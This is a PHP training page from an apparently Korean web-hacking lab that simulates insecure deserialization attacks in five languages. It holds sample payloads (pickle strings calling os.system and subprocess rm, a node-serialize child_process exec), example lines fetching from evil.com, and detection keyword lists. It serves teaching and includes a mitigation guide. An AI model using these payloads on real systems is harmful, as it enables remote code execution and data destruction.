<?php
/**
 * Insecure Deserialization 취약점 테스트 페이지
 * 교육 목적으로만 사용하시기 바랍니다.
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$serialized_input = '';
$format_type = 'php';

// 교육용 취약한 클래스 (실제로는 위험함)
class VulnerableClass {
    private $command;
    private $file_path;
    
    public function __construct($command = '', $file_path = '') {
        $this->command = $command;
        $this->file_path = $file_path;
    }
    
    public function __wakeup() {
        // 시뮬레이션: 실제로는 실행하지 않음
        return "[시뮬레이션] __wakeup() 호출됨 - 명령어 실행 시도: " . $this->command;
    }
    
    public function __destruct() {
        // 시뮬레이션: 실제로는 실행하지 않음
        return "[시뮬레이션] __destruct() 호출됨 - 파일 삭제 시도: " . $this->file_path;
    }
}

// Deserialization 공격 시뮬레이션
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['serialized_data'])) {
    $serialized_input = $_POST['serialized_data'];
    $format_type = $_POST['format'] ?? 'php';
    
    if (empty($serialized_input)) {
        $result = "직렬화된 데이터를 입력해주세요.";
    } else {
        // 교육 목적의 Deserialization 공격 시뮬레이션
        $dangerous_patterns = [
            'php' => ['O:', 'C:', '__wakeup', '__destruct', '__toString', '__call', 'system', 'exec', 'shell_exec'],
            'java' => ['java.io.ObjectInputStream', 'readObject', 'java.lang.Runtime', 'ProcessBuilder', 'aced0005'],
            'python' => ['pickle', '__reduce__', '__setstate__', 'subprocess', 'os.system', 'eval', 'exec'],
            'dotnet' => ['BinaryFormatter', 'ObjectStateFormatter', 'System.Diagnostics.Process', 'TypeConverter'],
            'nodejs' => ['serialize-javascript', 'eval(', 'Function(', 'child_process', 'require(']
        ];
        
        $payload_detected = false;
        $detected_patterns = [];
        $attack_vectors = [];
        
        foreach ($dangerous_patterns[$format_type] as $pattern) {
            if (stripos($serialized_input, $pattern) !== false) {
                $payload_detected = true;
                $detected_patterns[] = $pattern;
            }
        }
        
        if ($payload_detected) {
            $result = "[시뮬레이션] Insecure Deserialization 공격 감지됨\n";
            $result .= "형식: " . strtoupper($format_type) . "\n";
            $result .= "감지된 패턴: " . implode(', ', $detected_patterns) . "\n\n";
            
            // 형식별 특화된 경고 메시지
            switch ($format_type) {
                case 'php':
                    $result .= "PHP Deserialization 공격 시나리오:\n";
                    $result .= "- Object Injection: O:13:\"VulnerableClass\":2:{...}\n";
                    $result .= "- Magic Method 악용: __wakeup(), __destruct() 호출\n";
                    $result .= "- 가능한 공격:\n";
                    $result .= "  → 임의 코드 실행: system('id')\n";
                    $result .= "  → 파일 삭제/생성: unlink('/tmp/file')\n";
                    $result .= "  → 원격 코드 실행: file_get_contents('http://evil.com/shell.php')\n";
                    
                    // PHP 역직렬화 시뮬레이션
                    if (strpos($serialized_input, 'VulnerableClass') !== false) {
                        $result .= "\n[시뮬레이션 결과]\n";
                        $result .= "- VulnerableClass 객체 생성됨\n";
                        $result .= "- __wakeup() 메소드 자동 호출\n";
                        $result .= "- 위험한 작업이 수행될 수 있습니다!";
                    }
                    break;
                    
                case 'java':
                    $result .= "Java Deserialization 공격 시나리오:\n";
                    $result .= "- Gadget Chain 구성: Commons Collections, Spring Framework\n";
                    $result .= "- ObjectInputStream.readObject() 악용\n";
                    $result .= "- 가능한 공격:\n";
                    $result .= "  → Runtime.getRuntime().exec(\"calc\")\n";
                    $result .= "  → ProcessBuilder를 통한 명령 실행\n";
                    $result .= "  → JNDI Lookup을 통한 원격 코드 로딩\n";
                    $result .= "  → 메모리 손상 및 DoS 공격";
                    break;
                    
                case 'python':
                    $result .= "Python Deserialization 공격 시나리오:\n";
                    $result .= "- pickle.loads() 악용\n";
                    $result .= "- __reduce__ 메소드를 통한 코드 실행\n";
                    $result .= "- 가능한 공격:\n";
                    $result .= "  → os.system('/bin/sh')\n";
                    $result .= "  → subprocess.call(['rm', '-rf', '/'])\n";
                    $result .= "  → eval('__import__(\"os\").system(\"id\")')\n";
                    $result .= "  → 네트워크를 통한 리버스 쉘";
                    break;
                    
                case 'dotnet':
                    $result .= ".NET Deserialization 공격 시나리오:\n";
                    $result .= "- BinaryFormatter.Deserialize() 악용\n";
                    $result .= "- ViewState MAC 우회\n";
                    $result .= "- 가능한 공격:\n";
                    $result .= "  → System.Diagnostics.Process.Start(\"cmd\")\n";
                    $result .= "  → PowerShell 스크립트 실행\n";
                    $result .= "  → Assembly.Load()를 통한 코드 로딩\n";
                    $result .= "  → Active Directory 권한 상승";
                    break;
                    
                case 'nodejs':
                    $result .= "Node.js Deserialization 공격 시나리오:\n";
                    $result .= "- JSON.parse() + eval() 조합\n";
                    $result .= "- serialize-javascript 라이브러리 악용\n";
                    $result .= "- 가능한 공격:\n";
                    $result .= "  → require('child_process').exec('id')\n";
                    $result .= "  → Function('return process')().exit()\n";
                    $result .= "  → 파일 시스템 접근: fs.readFileSync('/etc/passwd')\n";
                    $result .= "  → 원격 모듈 로딩: require('http').get('evil.com')";
                    break;
            }
            
        } else {
            // 안전한 직렬화 데이터 처리 시뮬레이션
            $result = "안전한 직렬화 데이터 처리:\n";
            $result .= "형식: " . strtoupper($format_type) . "\n";
            $result .= "위험한 패턴이 감지되지 않았습니다.\n\n";
            
            // 형식별 안전한 처리 결과
            switch ($format_type) {
                case 'php':
                    if (preg_match('/^a:\d+:\{.*\}$/', $serialized_input)) {
                        $result .= "PHP 배열 직렬화 데이터로 식별됨\n";
                        $result .= "객체가 아닌 기본 데이터 타입으로 안전함";
                    } elseif (preg_match('/^s:\d+:".*";$/', $serialized_input)) {
                        $result .= "PHP 문자열 직렬화 데이터로 식별됨\n";
                        $result .= "단순 문자열로 안전함";
                    } else {
                        $result .= "알 수 없는 PHP 직렬화 형식\n";
                        $result .= "추가 검증이 필요합니다.";
                    }
                    break;
                    
                case 'java':
                    $result .= "Java 직렬화 데이터 분석:\n";
                    $result .= "기본 데이터 타입 또는 안전한 클래스로 판단됨\n";
                    $result .= "화이트리스트에 포함된 클래스만 허용 권장";
                    break;
                    
                case 'python':
                    $result .= "Python pickle 데이터 분석:\n";
                    $result .= "기본 데이터 구조로 판단됨\n";
                    $result .= "JSON 형식 사용을 권장합니다.";
                    break;
                    
                case 'dotnet':
                    $result .= ".NET 직렬화 데이터 분석:\n";
                    $result .= "기본 타입 또는 안전한 클래스로 판단됨\n";
                    $result .= "DataContractSerializer 사용 권장";
                    break;
                    
                case 'nodejs':
                    $result .= "Node.js 직렬화 데이터 분석:\n";
                    $result .= "JSON 형식으로 안전하게 처리됨\n";
                    $result .= "표준 JSON.parse() 사용으로 안전함";
                    break;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insecure Deserialization 테스트 - <?php echo SITE_NAME; ?></title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .container {
            max-width: 1000px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .vulnerability-description, .mitigation-guide {
            background-color: #f9f9f9;
            border-left: 5px solid #f39c12;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .mitigation-guide {
            border-color: #28a745;
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        select {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin: 10px 0;
            width: 200px;
        }
        .payload-btn {
            background: #17a2b8;
            color: white;
            border: none;
            padding: 8px 12px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .payload-btn:hover {
            background: #138496;
        }
        .nav {
            background: #343a40;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav h1 {
            margin: 0;
            color: white;
        }
        .nav-links .btn {
            margin-left: 10px;
            background: #007bff;
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 4px;
        }
        .format-tabs {
            margin: 15px 0;
        }
        .format-tabs button {
            background: #6c757d;
            color: white;
            border: none;
            padding: 10px 15px;
            margin-right: 5px;
            border-radius: 4px 4px 0 0;
            cursor: pointer;
        }
        .format-tabs button.active {
            background: #007bff;
        }
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 바 -->
        <nav class="nav">
            <h1>Insecure Deserialization 테스트</h1>
            <div class="nav-links">
                <span>환영합니다, <?php echo safe_output($_SESSION['username']); ?>님!</span>
                <a href="../index.php" class="btn">메인으로</a>
                <a href="index.php" class="btn">웹해킹 메뉴</a>
                <a href="../logout.php" class="btn">로그아웃</a>
            </div>
        </nav>

        <div class="vulnerability-description">
            <h2>🔓 Insecure Deserialization 취약점</h2>
            <p><strong>설명:</strong> 신뢰할 수 없는 소스에서 받은 직렬화된 데이터를 역직렬화할 때 발생하는 취약점입니다. 
            임의 코드 실행, 권한 상승, DoS 공격 등이 가능하며 OWASP Top 10에 포함된 심각한 취약점입니다.</p>
            
            <div class="format-tabs">
                <button onclick="changeFormat('php')" class="active" id="php-tab">PHP</button>
                <button onclick="changeFormat('java')" id="java-tab">Java</button>
                <button onclick="changeFormat('python')" id="python-tab">Python</button>
                <button onclick="changeFormat('dotnet')" id="dotnet-tab">.NET</button>
                <button onclick="changeFormat('nodejs')" id="nodejs-tab">Node.js</button>
            </div>
            
            <h3 id="payload-title">📋 PHP Deserialization 테스트 페이로드:</h3>
            <div id="payload-buttons" style="margin: 10px 0;">
                <button onclick="testPayload('object_injection')" class="payload-btn">객체 주입</button>
                <button onclick="testPayload('magic_method')" class="payload-btn">매직 메소드</button>
                <button onclick="testPayload('code_execution')" class="payload-btn">코드 실행</button>
                <button onclick="testPayload('property_oriented')" class="payload-btn">POP Chain</button>
                <button onclick="testPayload('safe')" class="payload-btn">안전한 데이터</button>
            </div>
        </div>

        <div class="warning-box">
            <strong>⚠️ 주의사항:</strong> 이 테스트는 시뮬레이션으로만 동작합니다. 
            실제 환경에서 악의적인 직렬화된 데이터를 역직렬화하면 시스템이 완전히 손상될 수 있습니다.
        </div>

        <form method="POST">
            <label for="format">🔧 직렬화 형식 선택:</label><br>
            <select id="format" name="format">
                <option value="php" <?php echo ($format_type == 'php') ? 'selected' : ''; ?>>PHP Serialization</option>
                <option value="java" <?php echo ($format_type == 'java') ? 'selected' : ''; ?>>Java Serialization</option>
                <option value="python" <?php echo ($format_type == 'python') ? 'selected' : ''; ?>>Python Pickle</option>
                <option value="dotnet" <?php echo ($format_type == 'dotnet') ? 'selected' : ''; ?>.NET BinaryFormatter</option>
                <option value="nodejs" <?php echo ($format_type == 'nodejs') ? 'selected' : ''; ?>>Node.js JSON</option>
            </select><br><br>
            
            <label for="serialized_data">🎯 직렬화된 데이터 입력:</label><br>
            <textarea id="serialized_data" name="serialized_data" placeholder="직렬화된 데이터를 입력하세요..."><?php echo htmlspecialchars($serialized_input); ?></textarea><br><br>
            <input type="submit" value="역직렬화 실행" class="btn">
        </form>

        <?php if (!empty($result)): ?>
            <div style="margin-top: 20px;">
                <h2>📊 테스트 결과:</h2>
                <pre style="background: #f1f3f4; padding: 15px; border-radius: 5px; border-left: 4px solid #dc3545;"><?php echo htmlspecialchars($result); ?></pre>
            </div>
        <?php endif; ?>

        <div class="mitigation-guide">
            <h2>🛡️ 방어 방법</h2>
            <ul>
                <li><strong>직렬화 사용 최소화:</strong> 가능한 한 JSON 등 텍스트 기반 형식 사용</li>
                <li><strong>데이터 서명:</strong> HMAC 등을 사용한 데이터 무결성 검증</li>
                <li><strong>화이트리스트:</strong> 역직렬화 가능한 클래스 제한</li>
                <li><strong>샌드박스:</strong> 역직렬화를 격리된 환경에서 수행</li>
                <li><strong>타입 체크:</strong> 역직렬화 전 데이터 타입 검증</li>
                <li><strong>네트워크 분리:</strong> 직렬화 데이터 처리 서버 분리</li>
                <li><strong>모니터링:</strong> 의심스러운 직렬화 패턴 감지</li>
            </ul>
        </div>

        <div style="margin-top: 20px; text-align: center;">
            <a href="index.php" class="btn">← 웹해킹 테스트 메뉴로 돌아가기</a>
        </div>
    </div>

    <script>
        const payloads = {
            php: {
                object_injection: 'O:15:"VulnerableClass":2:{s:7:"command";s:2:"id";s:9:"file_path";s:9:"/tmp/test";}',
                magic_method: 'O:8:"stdClass":1:{s:4:"test";s:22:"<?php system(\'id\'); ?>";}',
                code_execution: 'O:15:"VulnerableClass":1:{s:7:"command";s:14:"rm -rf / --help";}',
                property_oriented: 'O:15:"VulnerableClass":3:{s:7:"command";s:6:"whoami";s:9:"file_path";s:11:"/etc/passwd";s:4:"data";s:15:"malicious_data";}',
                safe: 'a:3:{s:4:"name";s:8:"testuser";s:3:"age";i:25;s:5:"email";s:18:"test@example.com";}'
            },
            java: {
                object_injection: 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f400000000000001077080000001000000001740004636f6d6d616e647400026964740009666967687465727a65726f78',
                magic_method: 'aced0005737200176a6176612e6c616e672e72756e74696d652e52756e74696d65',
                code_execution: 'aced0005737200116a6176612e6c616e672e50726f6365737342756966646572',
                property_oriented: 'aced0005737200286f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d6170',
                safe: '{"name":"testuser","age":25,"email":"test@example.com"}'
            },
            python: {
                object_injection: 'c__builtin__\neval\np0\n(Vos.system("id")\np1\ntp2\nRp3\n.',
                magic_method: 'cos\nsystem\np0\n(S\'id\'\np1\ntp2\nRp3\n.',
                code_execution: 'c__builtin__\nexec\np0\n(V__import__("os").system("whoami")\np1\ntp2\nRp3\n.',
                property_oriented: 'csubprocess\ncall\np0\n(lp1\nS\'rm\'\naS\'-rf\'\naS\'/tmp\'\natp2\nRp3\n.',
                safe: '{"name": "testuser", "age": 25, "email": "test@example.com"}'
            },
            dotnet: {
                object_injection: '/wEykwABAAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uV2luZG93cy5Gb3Jtcy5CdXR0b24sIFN5c3RlbS5XaW5kb3dzLkZvcm1z',
                magic_method: '/wEykwABAAEAAAD/////AQAAAAAAAAAEAQAAACFTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcw==',
                code_execution: '/wEykwABAAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVy',
                property_oriented: '/wEykwABAAEAAAD/////AQAAAAAAAAAEAQAAACVTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWdu',
                safe: '{"name":"testuser","age":25,"email":"test@example.com"}'
            },
            nodejs: {
                object_injection: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) })}()"}',
                magic_method: '{"__proto__":{"isAdmin":true,"command":"id"}}',
                code_execution: '{"eval":"require(\'child_process\').execSync(\'whoami\').toString()"}',
                property_oriented: '{"constructor":{"prototype":{"isAdmin":true}}}',
                safe: '{"name":"testuser","age":25,"email":"test@example.com"}'
            }
        };

        const formatDescriptions = {
            php: 'PHP Deserialization 테스트 페이로드',
            java: 'Java Deserialization 테스트 페이로드',
            python: 'Python Pickle 테스트 페이로드',
            dotnet: '.NET BinaryFormatter 테스트 페이로드',
            nodejs: 'Node.js 역직렬화 테스트 페이로드'
        };

        function changeFormat(format) {
            // 탭 활성화
            document.querySelectorAll('.format-tabs button').forEach(btn => btn.classList.remove('active'));
            document.getElementById(format + '-tab').classList.add('active');
            
            // 형식 선택
            document.getElementById('format').value = format;
            
            // 제목 변경
            document.getElementById('payload-title').textContent = '📋 ' + formatDescriptions[format] + ':';
        }

        function testPayload(type) {
            const format = document.getElementById('format').value;
            const payload = payloads[format][type];
            
            if (confirm('⚠️ 교육 목적의 Deserialization 테스트를 실행하시겠습니까?\n\n형식: ' + format + '\n유형: ' + type + '\n\n주의: 실제 환경에서는 매우 위험합니다!')) {
                document.getElementById('serialized_data').value = payload;
            }
        }

        // 위험 패턴 경고
        document.getElementById('serialized_data').addEventListener('input', function() {
            const value = this.value.toLowerCase();
            const warningPatterns = ['o:', '__wakeup', '__destruct', 'system', 'exec', 'eval', 'aced0005', 'pickle', 'require('];
            
            let isRisky = warningPatterns.some(pattern => value.includes(pattern));
            
            if (isRisky) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#ddd';
                this.style.backgroundColor = 'white';
            }
        });

        // 형식 변경 시 페이로드 업데이트
        document.getElementById('format').addEventListener('change', function() {
            changeFormat(this.value);
        });
    </script>
</body>
</html>